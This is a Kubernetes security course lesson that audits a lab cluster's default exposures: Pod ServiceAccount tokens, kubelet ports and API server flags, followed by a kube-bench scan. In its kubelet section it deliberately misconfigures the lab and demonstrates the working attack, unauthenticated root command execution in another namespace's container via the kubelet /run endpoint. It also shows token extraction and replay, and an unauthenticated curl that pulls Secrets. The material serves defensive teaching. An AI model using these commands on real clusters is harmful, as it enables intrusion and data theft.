# The doors the cluster leaves open

Six lessons of adding controls. This one adds nothing. It goes looking for what is already switched on.

There are two threads to pick up. Lesson 04 measured that every Pod you have ever created came back carrying a volume you never asked for — `kube-api-access-` and five random characters, holding a credential for talking to the API server — and said it was this lesson's whole subject. And lesson 06 ended by admitting that its own protection stopped at a file on a node, which was the third time this act arrived at "and then someone has a shell on the node" as the end of the argument.

Both are the same question, and it is not "what should I turn on". It is: **what is reachable, right now, by something that has arrived with no credentials at all — and why is it reachable?** Because almost every answer will turn out to be a default that exists so that something would not break, and the interesting part is telling apart the ones that are fine from the ones that are a catastrophe wearing the same clothes.

> **Predict first —** four commitments, and (c) is the one worth writing down properly. **(a)** From inside an ordinary Pod, can you reach the Kubernetes API server at all? And can you reach the *kubelet* on your own node? **(b)** The token in that volume: how long is it valid for? Give a number. **(c)** You copy that token out of a Pod, then delete the Pod, then present the token to the API server. Predict the status code — and note that Act IX taught you to read `401` and `403` as answers to different questions, so your prediction commits you to a claim about *which* question fails. **(d)** `--anonymous-auth` on the API server: is it on or off by default, and is your answer to "should it be off" the same for the API server as for the kubelet?

### Door one: the credential you were issued without asking

```bash
export KUBECONFIG="${TMPDIR:-/tmp}/act10.kubeconfig"
kind get kubeconfig --name netlab > "$KUBECONFIG"

kubectl create ns doors
kubectl run probe -n doors --image=curlimages/curl:8.11.1 --restart=Never --command -- sleep 3600
kubectl wait --for=condition=Ready pod/probe -n doors --timeout=90s
kubectl exec -n doors probe -- ls -l /var/run/secrets/kubernetes.io/serviceaccount/
```

```
total 0
lrwxrwxrwx    1 root     root            13 Aug 22 15:06 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root            16 Aug 22 15:06 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root            12 Aug 22 15:06 token -> ..data/token
```

Three files, all symlinks into `..data`, which is Act VII's mechanism for updating a mounted file without a reader ever seeing half of it. And read what they are together, because as a set they are a complete client configuration: `ca.crt` is who to trust, `namespace` is where you are, `token` is who you are. Nothing else is needed to talk to the cluster.

So take the token apart with Act IX's tooling:

```bash
kubectl exec -n doors probe -- cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/tok.jwt
python3 -c "
import base64, json
p = open('/tmp/tok.jwt').read().strip().split('.')[1]
print(json.dumps(json.loads(base64.urlsafe_b64decode(p + '=' * (-len(p) % 4))), indent=2))
"
```

```json
{
  "aud": [ "https://kubernetes.default.svc.cluster.local" ],
  "exp": 1818947195,
  "iat": 1787411195,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "jti": "5e457217-2474-4090-bd18-068481021a98",
  "kubernetes.io": {
    "namespace": "doors",
    "node": { "name": "netlab-worker", "uid": "a2ed8387-0f74-411f-8a16-dbbe98275116" },
    "pod":  { "name": "probe",         "uid": "2689dfe0-2ec6-4a82-93f7-d46c8eac3b00" },
    "serviceaccount": { "name": "default", "uid": "fcede8a9-cd6d-462e-a4b6-2285c81cbee7" },
    "warnafter": 1787414802
  },
  "nbf": 1787411195,
  "sub": "system:serviceaccount:doors:default"
}
```

Act IX's five registered claims are all there and all doing their job — `iss`, `sub`, `aud`, `exp`, `iat`. The `aud` is the cluster's own issuer URL, which is why the audience-scoped token in Act IX's diagnose drill got a `401`: a token minted for `vault` is not addressed to this server.

The interesting part is the `kubernetes.io` block, because it names three objects **by uid**: the ServiceAccount, the **Pod**, and the **node**. Hold that; it is prediction (c).

First prediction (b), which almost everybody gets wrong in the safe direction:

```bash
python3 -c "
import base64, json
p = open('/tmp/tok.jwt').read().strip().split('.')[1]
d = json.loads(base64.urlsafe_b64decode(p + '=' * (-len(p) % 4)))
print('exp - iat       =', d['exp']-d['iat'], 'seconds =', round((d['exp']-d['iat'])/86400), 'days')
print('warnafter - iat =', d['kubernetes.io']['warnafter']-d['iat'], 'seconds')
"
```

```
exp - iat       = 31536000 seconds = 365 days
warnafter - iat = 3607 seconds
```

**A year.** The famous improvement in this area — projected, bound, short-lived tokens replacing the old never-expiring Secret-based ones — ships with a **one-year** expiry, and the hour you were expecting is present only as `warnafter`, a marker the API server uses to complain that a client is not re-reading the file.

Find out whose decision that was:

```bash
docker exec netlab-control-plane grep -E "service-account" /etc/kubernetes/manifests/kube-apiserver.yaml
docker exec netlab-control-plane sh -c \
  'C=$(crictl ps --name kube-apiserver -q | head -1); crictl exec $C kube-apiserver --help' \
  2>&1 | grep -A 3 "service-account-extend-token-expiration"
```

```
    - --service-account-issuer=https://kubernetes.default.svc.cluster.local
    - --service-account-key-file=/etc/kubernetes/pki/sa.pub
    - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key

      --service-account-extend-token-expiration    Turns on projected service account expiration
      extension during token generation, which helps safe transition from legacy token to bound
      service account token feature. If this flag is enabled, admission injected tokens would be
      extended up to 1 year to prevent unexpected failure during transition, ignoring value of
      service-account-max-token-expiration. (default true)
```

Nobody's, is the answer — the flag is not in the manifest, so this is the **upstream default**. And read the last clause of that help text, because it is unusually candid: *ignoring value of `service-account-max-token-expiration`*. The flag that gives you a year explicitly overrules the flag you would set to make it shorter. If you have ever tightened a token lifetime and later found year-long tokens in your cluster, that sentence is why.

This is the act's thesis with the machinery visible. Not "somebody was careless" — a deliberate, documented decision that a silent compatibility risk is preferable to a loud breakage, taken by people who were right about which one gets reported.

### What that credential can do, and what it proves

```bash
kubectl exec -n doors probe -- sh -c '
SA=/var/run/secrets/kubernetes.io/serviceaccount
curl -s -o /dev/null -w "GET /version           -> %{http_code}\n" --cacert $SA/ca.crt https://kubernetes.default.svc/version
curl -s -o /dev/null -w "GET /api/v1/pods       -> %{http_code}\n" --cacert $SA/ca.crt -H "Authorization: Bearer $(cat $SA/token)" https://kubernetes.default.svc/api/v1/pods
'
kubectl auth can-i --list --as=system:serviceaccount:doors:default | head -8
```

```
GET /version           -> 200
GET /api/v1/pods       -> 403

Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
```

Two findings, and they point in opposite directions.

The reassuring one: the `default` ServiceAccount can do essentially nothing. It may ask about itself, and it may read the API's own discovery documents — which, note, is the exact rule Act IX lesson 04 dug up when it found that fetching the JWKS required a ClusterRole bound to the group `system:serviceaccounts`. Nothing here can list a Pod.

The other one is prediction (a), and it is the more important half: **`200`**. The API server is reachable from an ordinary Pod, on the pod network, with nothing in the way. That is not a permission, it is a *route*, and it means the security of every Pod in your cluster rests on RBAC being right rather than on anything being unreachable. The moment somebody binds a Role to `default` in a namespace to unblock a deploy — Act IX's "permission that accumulated" — they have granted it to every Pod in that namespace, including the one running a dependency they have never read.

### Prediction (c): the token that dies with its Pod

```bash
TOK=$(cat /tmp/tok.jwt)
API=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
kubectl config view --minify --raw \
  -o jsonpath='{.clusters[0].cluster.certificate-authority-data}' | base64 -d > /tmp/ca.crt

curl -s --cacert /tmp/ca.crt -H "Authorization: Bearer $TOK" "$API/api/v1/namespaces/doors/pods" \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['message'])"
```

```
pods is forbidden: User "system:serviceaccount:doors:default" cannot list resource "pods" in API group "" in the namespace "doors"
```

`403`, with a username in it. Act IX's first diagnostic: a username in the message means authentication finished and this is a rules problem.

Now delete the Pod and present the identical bytes:

```bash
kubectl delete pod probe -n doors
sleep 5
curl -s -o /dev/null -w "%{http_code}\n" --cacert /tmp/ca.crt \
  -H "Authorization: Bearer $TOK" "$API/api/v1/namespaces/doors/pods"
```

```
401
```

**403 became 401.** Not "forbidden" — *unauthenticated*. The same token, still years from its `exp`, still perfectly signed, and the API server no longer recognises it as a credential at all.

Which is worth stopping over, because it is the one place in this entire course where a problem Act IX declared structural is actually solved.

Act IX lesson 02 measured a deleted ServiceAccount whose token kept authenticating for about ten seconds, and drew the conclusion that a signed claim is a photograph: it tells you about the moment it was taken, so revocation is either a cache you shorten or an availability risk you take, and there is no third option. Act IX's whole in-the-wild page is built on that trade.

Here the third option exists, and it is not a shorter cache. The token **names the Pod, by uid**, and authentication verifies that object still exists:

```bash
docker exec netlab-control-plane sh -c \
  'C=$(crictl ps --name kube-apiserver -q | head -1); crictl exec $C kube-apiserver --help' \
  2>&1 | grep "service-account-lookup"
```

```
      --service-account-lookup    If true, validate ServiceAccount tokens exist in etcd as part of
                                  authentication. (default true)
```

So the credential stopped being a photograph and became a **handle** — Act IX lesson 02's other shape, the one whose cost is a lookup against something that must be up. The cluster took that cost, on the authentication path, deliberately, and what it bought is that deleting a Pod revokes its credential *now*.

Notice what makes it work, because it generalises well past Kubernetes: **the credential refers to something whose existence is already being tracked.** Nobody built a revocation list. The Pod object is the revocation list. That is the trick to reach for whenever you meet this problem — not "how do I revoke", but "what does this credential already have to agree with".

And notice what it does *not* fix, which is why the one-year expiry still matters: while the Pod is alive, the token is valid, and a Pod can be alive for a year.

### Closing door one

```bash
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata: {name: notoken, namespace: doors}
spec:
  automountServiceAccountToken: false
  containers:
  - name: c
    image: busybox:1.36
    command: ["sh","-c","ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1; sleep 30"]
EOF
sleep 12
kubectl logs notoken -n doors
kubectl get pod notoken -n doors -o jsonpath='volumes: {.spec.volumes}{"\n"}'
```

```
ls: /var/run/secrets/kubernetes.io/serviceaccount/: No such file or directory
volumes:
```

Not "an empty directory" — **`spec.volumes` is empty**. The volume was never added, which means what you have actually switched off is the *mutation* from lesson 04: the ServiceAccount admission controller looked at this Pod and declined to inject. That is the same mechanism you watched rewrite a bare `kubectl run`, now visibly not firing.

One Pod at a time is not a policy, though. The useful form is on the ServiceAccount, where it covers every Pod that uses it:

```bash
kubectl patch serviceaccount default -n doors -p '{"automountServiceAccountToken": false}'
kubectl run sa-off -n doors --image=busybox:1.36 --restart=Never --command -- \
  sh -c 'ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1'
sleep 10
kubectl logs sa-off -n doors
```

```
ls: /var/run/secrets/kubernetes.io/serviceaccount/: No such file or directory
```

(Pod-level wins where both are set, so a workload that genuinely needs the token can opt back in.)

And now the measurement that keeps you honest about what you just achieved. Bring the probe back and ask whether the *door* closed or only the *key*:

```bash
kubectl run probe2 -n doors --image=curlimages/curl:8.11.1 --restart=Never --command -- sleep 3600
kubectl wait --for=condition=Ready pod/probe2 -n doors --timeout=90s
kubectl exec -n doors probe2 -- \
  curl -s -o /dev/null -w "kubernetes.default -> %{http_code}\n" -k https://kubernetes.default.svc/version
```

```
kubernetes.default -> 200
```

**The route is unchanged.** Removing the token removed a credential, not a path. Every Pod in your cluster can still open a connection to the API server and try things; it simply has nothing to try them with. Whether that distinction matters depends entirely on whether anything else in that Pod can obtain a credential — a mounted Secret, a cloud metadata endpoint, an environment variable — and this act has spent six lessons on how easily that happens.

The thing that closes the route is a NetworkPolicy, which is Act V's mechanism and not this act's. It is also the honest limit of this lab: Act V established that **kindnet accepts a NetworkPolicy and enforces nothing** — no error, no effect — and used it as the example of an unreconciled object being indistinguishable from a working one. So a default-deny egress policy is the right answer here and this cluster cannot demonstrate it, which is worth knowing in exactly the shape Act V put it: if you write one and see no change, find out which of the two things you are looking at.

### Door two: the port on every node

Every node runs a kubelet, and the kubelet has an HTTP API. Ask it, from a Pod:

```bash
WIP=$(docker inspect netlab-worker -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
echo "worker: $WIP"
kubectl exec -n doors probe2 -- sh -c "
curl -sk -o /dev/null -w 'GET https://$WIP:10250/pods    -> %{http_code}\n' https://$WIP:10250/pods
curl -sk -o /dev/null -w 'GET https://$WIP:10250/metrics -> %{http_code}\n' https://$WIP:10250/metrics
curl -sk -o /dev/null -w 'GET http://$WIP:10255/pods     -> %{http_code}\n' --max-time 5 http://$WIP:10255/pods
curl -sk https://$WIP:10250/pods
"
```

```
worker: 172.19.0.3
GET https://172.19.0.3:10250/pods    -> 401
GET https://172.19.0.3:10250/metrics -> 401
GET http://172.19.0.3:10255/pods     -> 000
Unauthorized
```

Shut. `10250` demands a credential and `10255` — the historical **read-only port** — is not listening at all. The `000` is curl failing to connect, not an HTTP status.

Which is a good default, arrived at the hard way, and you can read the decision:

```bash
docker exec netlab-worker sh -c \
  'grep -A 3 "^authentication:" /var/lib/kubelet/config.yaml; grep -A 1 "^authorization:" /var/lib/kubelet/config.yaml'
```

```
authentication:
  anonymous:
    enabled: false
  webhook:
```
```
authorization:
  mode: Webhook
```

Two separate settings, and both matter. `anonymous: false` means a request with no credential is refused rather than being treated as a nameless caller. `mode: Webhook` means the kubelet does not decide for itself what a caller may do — it **asks the API server**, via a `SubjectAccessReview`, so kubelet authorization is your cluster's RBAC rather than a second policy system.

Now find out what those two lines are protecting. This is a deliberate misconfiguration of your own lab, and it is worth doing rather than reading, because the result is not what most people expect from "the read-only port is off":

```bash
docker exec netlab-worker cp /var/lib/kubelet/config.yaml /root/kubelet.bak
docker exec netlab-worker cat /var/lib/kubelet/config.yaml > /tmp/kubelet.yaml
python3 - <<'PY'
p = "/tmp/kubelet.yaml"; t = open(p).read()
t = t.replace("authentication:\n  anonymous:\n    enabled: false",
              "authentication:\n  anonymous:\n    enabled: true", 1)
t = t.replace("authorization:\n  mode: Webhook",
              "authorization:\n  mode: AlwaysAllow", 1)
open(p, "w").write(t)
print("patched")
PY
docker exec -i netlab-worker sh -c 'cat > /var/lib/kubelet/config.yaml' < /tmp/kubelet.yaml
docker exec netlab-worker systemctl restart kubelet
sleep 20
kubectl get nodes
```

```
patched
NAME                   STATUS   ROLES           AGE   VERSION
netlab-control-plane   Ready    control-plane   24h   v1.36.1
netlab-worker          Ready    <none>          24h   v1.36.1
```

Both nodes still `Ready`, and nothing anywhere reports that one of them has just stopped checking who is asking. Now knock:

```bash
kubectl exec -n doors probe2 -- sh -c "
curl -sk -o /dev/null -w 'GET /pods -> %{http_code}\n' https://$WIP:10250/pods
curl -sk https://$WIP:10250/pods | tr ',' '\n' | grep '\"namespace\"' | sort -u | head -3
"
```

```
GET /pods -> 200
"namespace":"doors"
"namespace":"kube-system"
```

Every Pod on that node, with its full spec — which includes the names of every Secret and ConfigMap they mount, their environment variables, and their volume paths. That alone is a reconnaissance win.

But `/pods` is not why this port has a reputation. Put a target on the node in a **different namespace**, with something worth having in it:

```bash
kubectl create ns victim
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata: {name: target, namespace: victim}
spec:
  nodeName: netlab-worker
  containers:
  - name: app
    image: busybox:1.36
    command: ["sh","-c","echo 'company-confidential' > /tmp/data; sleep 3600"]
EOF
kubectl wait --for=condition=Ready pod/target -n victim --timeout=90s
kubectl exec -n doors probe2 -- sh -c "
curl -sk -X POST 'https://$WIP:10250/run/victim/target/app?cmd=id'
curl -sk -X POST 'https://$WIP:10250/run/victim/target/app?cmd=cat%20/tmp/data'
"
```

```
uid=0(root) gid=0(root) groups=0(root),10(wheel)
company-confidential
```

Read the whole path that just happened. A Pod in namespace `doors`, holding **no credential of any kind** — its ServiceAccount token is switched off, remember — ran a command as **root inside a container in namespace `victim`** and read its files. No RBAC was consulted, because RBAC governs the API server and this never touched the API server. No admission controller was involved, because nothing was created. Nothing in lessons 01 through 06 is in this path at all: not capabilities, not seccomp, not Pod Security Admission, not a policy engine, not encryption at rest.

`/run/<namespace>/<pod>/<container>` is the kubelet's own exec endpoint, and it is the mechanism `kubectl exec` uses — the API server proxies to exactly this. Which is the point: the kubelet has to be able to do this, because that is its job. The only thing that ever made it safe was the two lines you just edited.

Put them back:

```bash
docker exec netlab-worker sh -c 'cp /root/kubelet.bak /var/lib/kubelet/config.yaml'
docker exec netlab-worker systemctl restart kubelet
sleep 25
kubectl exec -n doors probe2 -- sh -c "
curl -sk -o /dev/null -w 'GET /pods -> %{http_code}\n' https://$WIP:10250/pods
curl -sk -X POST -o /dev/null -w 'POST /run -> %{http_code}\n' 'https://$WIP:10250/run/victim/target/app?cmd=id'
"
docker exec netlab-worker rm -f /root/kubelet.bak
```

```
GET /pods -> 401
POST /run -> 401
```

Two things to keep. The first is a reflex: **`10250` and `10255` belong in whatever you use to check a cluster you have inherited**, and the check is not "is the port open" — it is open by necessity — but "does it demand a credential, and who decides what that credential may do". The second is the pattern, which this act keeps producing: the misconfigured cluster was `Ready`, healthy, and passing every readiness probe, and the only observable difference was a status code on a port nobody looks at.

### Door three: the flags on the API server itself

```bash
docker exec netlab-control-plane grep -E \
  "anonymous-auth|authorization-mode|profiling|insecure|audit-|enable-admission-plugins" \
  /etc/kubernetes/manifests/kube-apiserver.yaml
```

```
    - --authorization-mode=Node,RBAC
    - --enable-admission-plugins=NodeRestriction
```

Two flags set; everything else is a default. So go and read the defaults rather than guessing them:

```bash
docker exec netlab-control-plane sh -c \
  'C=$(crictl ps --name kube-apiserver -q | head -1); crictl exec $C kube-apiserver --help' \
  2>&1 | grep -E "^      --anonymous-auth|^      --profiling"
```

```
      --profiling        Enable profiling via web interface host:port/debug/pprof/ (default true)
      --anonymous-auth   Enables anonymous requests to the secure port of the API server. Requests
                         that are not rejected by another authentication method are treated as
                         anonymous requests. Anonymous requests have a username of system:anonymous,
                         and a group name of system:unauthenticated. (default true)
```

`--anonymous-auth` defaults to **true**, which is prediction (d). Find out what that actually exposes:

```bash
API=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
for p in /version /healthz /livez /readyz /metrics /api/v1/pods /openapi/v2; do
  printf "%-15s -> %s\n" "$p" \
    "$(curl -s -o /dev/null -w '%{http_code}' --cacert /tmp/ca.crt "$API$p")"
done
```

```
/version        -> 200
/healthz        -> 200
/livez          -> 200
/readyz         -> 200
/metrics        -> 403
/api/v1/pods    -> 403
/openapi/v2     -> 403
```

And now the answer to the second half of (d), which is **no, and for a reason you already hold**. Anonymous auth on the API server being on is *correct*, and Act IX lesson 01 is where you learned why: sending no credential is a successful authentication as a specific named identity, `system:anonymous` in group `system:unauthenticated`, and that design exists so that what nobody may do is written in ordinary RBAC rules rather than as a special case outside the permission system. The `403`s above are that design working — anonymous is a name, it is bound to almost nothing, and the four endpoints it can reach are the ones a load balancer must reach without a credential.

The kubelet was the opposite, and the difference is not the flag, it is what sits behind it. On the API server, anonymous requests fall through to `Node,RBAC` and get refused by rules. On the kubelet with `AlwaysAllow`, there were no rules to fall through to. **`anonymous-auth` is only as safe as the authorizer behind it**, which is why the same setting is fine in one component and catastrophic in another — and why CIS lists the API server one as a *manual* check rather than an automated failure.

`--profiling`, meanwhile, defaults to **true**, which means `/debug/pprof/` is served. It is behind authorization, so it is not open to the world, but it is a memory-dumping, CPU-profiling endpoint that no production cluster needs and that every hardening guide asks you to turn off.

Then the flag that *is* set, because it is the most valuable one in the file:

```bash
kubectl auth can-i list secrets --all-namespaces --as=system:node:netlab-worker
kubectl auth can-i get secret/db-creds -n default   --as=system:node:netlab-worker
kubectl auth can-i create pods -n default           --as=system:node:netlab-worker
```

```
no - can only read namespaced object of this type
no - no relationship found between node 'netlab-worker' and this object
yes
```

`--authorization-mode=Node,RBAC` puts the **Node authorizer** in front of RBAC, and it exists because a kubelet legitimately needs to read the Secrets of the Pods scheduled to it — which, without a special rule, means every kubelet needs to read every Secret, which means one compromised node is the whole cluster.

Look at the second message: **`no relationship found between node 'netlab-worker' and this object`**. That is not a rule lookup, it is a **graph reachability** question — is there a path from this node, through Pods bound to it, to this Secret? Which is a mechanism Act IX's in-the-wild page named and did not expect you to meet: it is **ReBAC**, the model that restricts its attributes to *relationships* precisely so that the reverse question stays computable. It has been running inside your API server since Act V, deciding what every kubelet may read.

And the third line is `yes`, which bounds the good news. A node identity can create Pods — it has to, for mirror pods — and a Pod is a thing that can reference any Secret in its namespace. That is the classic node-to-cluster escalation, and it is exactly why the second flag in that file exists: `NodeRestriction` is the admission plugin that constrains what a kubelet may write about its own Node and Pods. Two mechanisms, one on the authorization side and one on the admission side, both aimed at the same escalation, and you now know which lesson each of them belongs to.

### The tool that asks all of these questions at once

Everything above was a hand-audit. There is a benchmark — the CIS Kubernetes Benchmark — and a tool that checks it:

```bash
kubectl apply -f - <<'EOF'
apiVersion: batch/v1
kind: Job
metadata: {name: kube-bench, namespace: doors}
spec:
  template:
    spec:
      hostPID: true
      nodeName: netlab-control-plane
      tolerations:
      - key: node-role.kubernetes.io/control-plane
        operator: Exists
        effect: NoSchedule
      restartPolicy: Never
      containers:
      - name: kube-bench
        image: docker.io/aquasec/kube-bench:v0.10.7
        command: ["kube-bench","run","--targets","master"]
        volumeMounts:
        - {name: etc-k8s,        mountPath: /etc/kubernetes,  readOnly: true}
        - {name: var-lib-etcd,   mountPath: /var/lib/etcd,    readOnly: true}
        - {name: var-lib-kubelet,mountPath: /var/lib/kubelet, readOnly: true}
      volumes:
      - {name: etc-k8s,         hostPath: {path: /etc/kubernetes}}
      - {name: var-lib-etcd,    hostPath: {path: /var/lib/etcd}}
      - {name: var-lib-kubelet, hostPath: {path: /var/lib/kubelet}}
EOF
kubectl wait --for=condition=Complete job/kube-bench -n doors --timeout=180s
kubectl logs -n doors job/kube-bench | tail -6
```

```
== Summary total ==
43 checks PASS
11 checks FAIL
11 checks WARN
0 checks INFO
```

Note in passing what that manifest needed to work: `hostPID`, three `hostPath` mounts of the control plane's own configuration, and a toleration to land on a control-plane node. Lesson 03's `baseline` would refuse this Pod outright. A cluster-scanning tool has to be given most of what you spent this act taking away, which is a real and permanent tension in this subject rather than a flaw in kube-bench.

Now read the failures, because they are a table of contents:

```bash
kubectl logs -n doors job/kube-bench | grep '^\[FAIL\]'
```

```
[FAIL] 1.1.12 Ensure that the etcd data directory ownership is set to etcd:etcd (Automated)
[FAIL] 1.2.6  Ensure that the --kubelet-certificate-authority argument is set as appropriate (Automated)
[FAIL] 1.2.16 Ensure that the admission control plugin PodSecurityPolicy is set (Automated)
[FAIL] 1.2.19 Ensure that the --insecure-port argument is set to 0 (Automated)
[FAIL] 1.2.21 Ensure that the --profiling argument is set to false (Automated)
[FAIL] 1.2.22 Ensure that the --audit-log-path argument is set (Automated)
[FAIL] 1.2.23 Ensure that the --audit-log-maxage argument is set to 30 or as appropriate (Automated)
[FAIL] 1.2.24 Ensure that the --audit-log-maxbackup argument is set to 10 or as appropriate (Automated)
[FAIL] 1.2.25 Ensure that the --audit-log-maxsize argument is set to 100 or as appropriate (Automated)
[FAIL] 1.3.2  Ensure that the --profiling argument is set to false (Automated)
[FAIL] 1.4.1  Ensure that the --profiling argument is set to false (Automated)
```

`--profiling` three times, for the API server, controller-manager and scheduler — the default you just read. Four consecutive audit-log failures, which are lesson 10 and nothing else. And in the warnings:

```bash
kubectl logs -n doors job/kube-bench | grep '^\[WARN\]' | head -6
```

```
[WARN] 1.1.9  Ensure that the Container Network Interface file permissions are set to 644 or more restrictive (Manual)
[WARN] 1.2.1  Ensure that the --anonymous-auth argument is set to false (Manual)
[WARN] 1.2.10 Ensure that the admission control plugin EventRateLimit is set (Manual)
[WARN] 1.2.12 Ensure that the admission control plugin AlwaysPullImages is set (Manual)
[WARN] 1.2.33 Ensure that the --encryption-provider-config argument is set as appropriate (Manual)
[WARN] 1.2.34 Ensure that encryption providers are appropriately configured (Manual)
```

`--encryption-provider-config` — correctly flagged, because lesson 06's cleanup removed it. `--anonymous-auth`, as a *manual* check, for the reason worked out above. And `AlwaysPullImages`, which is a hint about lesson 08.

And then the two that matter most, for a reason that has nothing to do with your cluster. Go and check whether you can fix `1.2.16` and `1.2.19`:

```bash
docker exec netlab-control-plane sh -c \
  'C=$(crictl ps --name kube-apiserver -q | head -1); crictl exec $C kube-apiserver --help' \
  2>&1 | grep -c "insecure-port"
kubectl api-resources 2>/dev/null | grep -c podsecuritypolic
```

```
0
0
```

**`--insecure-port` is not a flag this API server has, and `PodSecurityPolicy` is not a thing that exists.** The insecure port was removed in Kubernetes 1.20; PodSecurityPolicy was removed in 1.25 and replaced by the Pod Security Admission you used in lesson 03. Two of eleven failures are unfixable, not because your cluster is wrong but because **the benchmark is checking for controls Kubernetes has deleted.**

Sit with that longer than the number deserves, because the failure mode it produces is the expensive one. A red `[FAIL]`, with a rule number and a remediation paragraph, is the most authoritative-looking output in this lesson, and two of them are wrong. A team that treats "zero FAILs" as the target will burn days trying to set a flag that does not exist; a team that discovers this will start discounting the whole report, which is worse, because the other nine are real. The correct posture is the one this act has asked for throughout: **a scanner tells you what it checked, not what is true**, and its authority is bounded by its own version. Read the remediation, check the mechanism still exists, then decide.

Which is also the honest answer to why this lesson exists at all rather than a link to a benchmark. Nine of those eleven findings you could have derived yourself from the last three sections, and the two you could not are the two that are wrong.

> **Check yourself —** you inherit a cluster. Its API server has `--anonymous-auth=true` and `--authorization-mode=AlwaysAllow`. A colleague looks at it and says the second flag is the emergency and the first is a hardening nice-to-have. Are they right, and what is the fastest command that tells you how bad it is?

<details>
<summary>Answer</summary>

They have the right ranking for the wrong reason, and the reason matters because it generalises.

`AlwaysAllow` is not merely worse than `anonymous-auth=true`. It is the thing that *converts* `anonymous-auth=true` from a correct default into a total compromise. This lesson measured both halves: on the API server, anonymous requests fall through to `Node,RBAC` and get `403`, so the flag is fine; on the kubelet with `AlwaysAllow`, the same setting yielded root command execution in another namespace's container. Neither flag is dangerous alone. **Authentication decides who you are; authorization decides what that is worth. A permissive authenticator in front of a strict authorizer is a design. A strict authenticator in front of `AlwaysAllow` is one credential leak away from the same outcome.** So the pair is what you assess, never a flag on its own.

The fastest measurement is one request with no credential at all:

```bash
curl -sk https://<apiserver>:6443/api/v1/secrets | head -c 200
```

If that returns Secrets, every unauthenticated caller who can reach the port is cluster-admin, and you are in an incident rather than a remediation. `curl -s -o /dev/null -w '%{http_code}' .../api/v1/nodes` is the same question in one line.

Two things to do before the flag fix, in this order. Find out **who can reach port 6443** — with `AlwaysAllow` the blast radius is exactly the network reachability of that port, and that is now the only control you have. And check whether anything already used it, which is lesson 10's subject and which you will almost certainly find you cannot answer, because a cluster configured like this does not have audit logging on either.

Then fix it, and expect the fix to break things: `AlwaysAllow` clusters accumulate workloads that were never granted anything, because they never needed to be. Which is lesson 03's migration problem again — turn on the strict thing in a mode that records instead of refuses, collect the list, then enforce.

</details>

<!-- figure -->
```
   SIX LESSONS OF ADDING CONTROLS. THIS ONE ADDS NOTHING.
   IT ASKS: WHAT IS REACHABLE, RIGHT NOW, WITH NO CREDENTIAL?

   DOOR 1 -- THE TOKEN IN EVERY POD  (L04's loose end)
     3 files, all symlinks into ..data (Act VII's atomic swap):
       ca.crt = who to trust · namespace = where · token = who
     claims: Act IX's 5, plus kubernetes.io naming the
       SERVICEACCOUNT, the POD and the NODE -- all by uid.
     exp - iat = 31536000s = 365 DAYS.  warnafter = iat+3607.
       --service-account-extend-token-expiration (default TRUE)
       "...extended up to 1 year to prevent unexpected failure
        during transition, IGNORING VALUE OF
        service-account-max-token-expiration"
       <- the flag that gives you a year OVERRULES the flag you
          would set to shorten it. the act's thesis, documented.
     power: 403 on pods. can-i --list = selfsubject*Reviews plus
       the discovery URLs (Act IX L04's own rule, showing up).
     BUT /version -> 200. THE APISERVER IS REACHABLE FROM EVERY
     POD. that is a ROUTE, not a permission -- so every Pod's
     safety rests on RBAC being right, and one Role bound to
     `default` grants it to every Pod in the namespace.

   AND THE ONE PLACE ACT IX'S TRADE ACTUALLY BREAKS
     token, pod alive ...... 403 "User system:serviceaccount:..."
     delete pod, SAME token  401 Unauthorized
     403 -> 401 = it stopped being a CREDENTIAL, not a permission.
     --service-account-lookup (default true) checks the named
     objects still EXIST. so the signed claim became a HANDLE.
     Act IX said: shorten the cache or accept the window, no
     third option. THIS is the third option, and the trick is
     that THE CREDENTIAL NAMES SOMETHING ALREADY BEING TRACKED.
     nobody built a revocation list. THE POD IS THE LIST.
     (still: alive Pod = valid token, and a Pod can live a year.)

   CLOSING IT: automountServiceAccountToken: false
     spec.volumes is EMPTY -- you switched off L04's MUTATION,
     not a mount. SA-level covers every Pod; Pod-level wins.
     then measure again: /version -> 200 STILL.
     YOU REMOVED THE KEY, NOT THE DOOR. the door is a
     NetworkPolicy -- which kindnet ACCEPTS AND DOES NOT
     ENFORCE (Act V). right answer, undemonstrable lab.

   DOOR 2 -- THE PORT ON EVERY NODE
     as shipped: 10250 -> 401 · 10255 -> 000 (not listening)
       anonymous.enabled: false
       authorization.mode: Webhook  <- asks the APISERVER
                                       (SubjectAccessReview), so
                                       kubelet authz IS your RBAC
     flip those two lines -> both nodes still READY, nothing
     reports anything, and:
       GET /pods -> 200   every Pod on the node, full spec:
                          every Secret name, every env var
       POST /run/victim/target/app?cmd=id
            -> uid=0(root)
            -> cat /tmp/data -> company-confidential
     FROM A POD IN ANOTHER NAMESPACE WITH NO CREDENTIAL.
     nothing from L01-L06 is in that path. not capabilities,
     not seccomp, not PSA, not a policy engine, not encryption.
     /run IS what kubectl exec proxies to. the kubelet MUST be
     able to do this. only those two lines ever made it safe.

   DOOR 3 -- THE FLAGS, AND WHY THE SAME FLAG IS FINE HERE
     set: --authorization-mode=Node,RBAC
          --enable-admission-plugins=NodeRestriction
     default: --anonymous-auth=TRUE · --profiling=TRUE
     anonymous reaches: /version /healthz /livez /readyz = 200
                        /metrics /api/v1/pods /openapi/v2 = 403
     AND THAT IS CORRECT -- Act IX L01: "nobody" is a NAME, so
     what nobody may do is written in ordinary rules.
     => anonymous-auth is only as safe as THE AUTHORIZER BEHIND
        IT. apiserver: falls through to RBAC. kubelet with
        AlwaysAllow: nothing to fall through to. same flag,
        opposite verdict. assess the PAIR, never one flag.

